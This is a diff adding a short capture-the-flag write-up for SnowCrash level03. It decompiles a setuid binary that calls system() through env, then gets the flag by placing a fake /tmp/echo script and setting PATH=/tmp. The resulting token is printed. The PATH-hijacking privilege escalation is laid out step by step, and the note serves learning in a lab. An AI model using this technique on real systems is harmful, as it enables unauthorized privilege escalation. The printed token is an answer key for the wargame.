@@ -1,0 +1,32 @@
+List home file
+	-> -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+
+./level03 (owned by flag03)
+	-> Exploit me
+
+Copy scp -P 4242 level03@10.12.1.137:~/level03 . 
+	NSA reverse tool (the best and free) Ghidra : https://ghidra-sre.org/
+	/*
+	  __rgid = getegid();
+	  __ruid = geteuid();
+	  setresgid(__rgid,__rgid,__rgid);
+	  setresuid(__ruid,__ruid,__ruid);
+	  iVar1 = system("/usr/bin/env echo Exploit me");
+	*/
+	setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.
+	and
+	geteuid() returns the effective user ID of the calling process.
+
+
+We have to change the env and call getflag through a proxy (so it will be called by the owner user flag03)
+	->new file /tmp/echo
+	/*
+	#!/bin/bash
+	/bin/getflag
+	*/
+
+	PATH=/tmp
+
+
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
